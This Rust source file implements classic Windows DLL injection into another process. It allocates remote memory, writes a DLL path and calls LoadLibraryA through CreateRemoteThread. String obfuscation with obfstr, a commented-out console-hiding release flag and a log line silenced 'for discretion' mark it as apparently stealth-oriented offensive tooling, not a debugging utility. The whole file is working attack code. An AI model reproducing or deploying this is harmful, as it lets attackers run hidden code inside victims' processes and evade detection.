// #![windows_subsystem = "windows"] // Décommenter pour la release (Mode GUI)
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::env;
use std::fs::File;
use std::io::Read;
use std::process::exit;
use std::ptr;
use obfstr::obfstr;

// =============================================================
// WINDOWS: INJECTION DLL
// =============================================================
#[cfg(target_os = "windows")]
pub unsafe fn inject_remote_dll(h_process: winapi::um::winnt::HANDLE, dll_name: &str) {
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
    use winapi::um::processthreadsapi::CreateRemoteThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE};
    use std::ffi::CString;

    // .to_string() est important ici aussi si on stockait dans une variable, 
    // mais ici on passe directement à CString::new donc ça va.
    let k32 = CString::new(obfstr!("kernel32.dll")).unwrap();
    let loadlib = CString::new(obfstr!("LoadLibraryA")).unwrap();
    
    let h_kernel32 = GetModuleHandleA(k32.as_ptr());
    let load_lib_addr = GetProcAddress(h_kernel32, loadlib.as_ptr());

    if load_lib_addr.is_null() { return; }

    let c_dll_name = CString::new(dll_name).unwrap();
    let dll_name_size = c_dll_name.as_bytes_with_nul().len();

    let remote_mem = VirtualAllocEx(h_process, ptr::null_mut(), dll_name_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if remote_mem.is_null() { return; }

    let mut written = 0;
    WriteProcessMemory(h_process, remote_mem, c_dll_name.as_ptr() as *const _, dll_name_size, &mut written);

    let h_thread = CreateRemoteThread(
        h_process, ptr::null_mut(), 0, Some(std::mem::transmute(load_lib_addr)), remote_mem, 0, ptr::null_mut()
    );

    if !h_thread.is_null() {
        // println!("    {} {}", obfstr!("[+] Injection dependance:"), dll_name); // Commenté pour discrétion
        WaitForSingleObject(h_thread, 1000); 
        winapi::um::handleapi::CloseHandle(h_thread);
    }
    VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
}